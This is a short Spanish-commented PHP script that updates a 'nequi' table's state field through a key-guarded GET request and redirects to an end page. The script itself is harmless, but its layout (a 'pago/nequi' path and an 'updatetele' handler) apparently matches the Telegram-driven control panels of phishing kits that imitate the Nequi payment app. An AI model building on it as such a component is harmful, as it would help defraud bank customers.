<?php
// Incluir el archivo de conexión a la base de datos y configuración
include '../../../db.php';
$config = include '../../../config.php';

// Clave de seguridad para validar solicitudes
$security_key = $config['security_key']; // Usar clave de config global

// Verificar los parámetros enviados
if (isset($_GET['id'], $_GET['estado'], $_GET['key']) && $_GET['key'] === $security_key) {
    $id = intval($_GET['id']);
    $estado = intval($_GET['estado']);

    // Actualizar el estado en la base de datos 'nequi' (no 'data')
    // Usando PDO
    $sql = "UPDATE nequi SET estado = :estado WHERE id = :id";
    $stmt = $conn->prepare($sql);

    if ($stmt) {
        if ($stmt->execute(['estado' => $estado, 'id' => $id])) {
            // Redirigir a la página de cierre
            // Ajustar ruta relativa si es necesario. En process/updatetele.php, ../end.php está en pago/nequi/end.php
            header("Location: ../end.php");
            exit();
        } else {
            error_log("Error al actualizar estado Nequi: " . print_r($stmt->errorInfo(), true));
            echo "Error al actualizar el estado.";
        }
    } else {
        echo "Error al preparar la consulta.";
    }
} else {
    // Mensaje para solicitudes inválidas o no autorizadas
    echo "Acceso no autorizado o parámetros inválidos.";
}
?>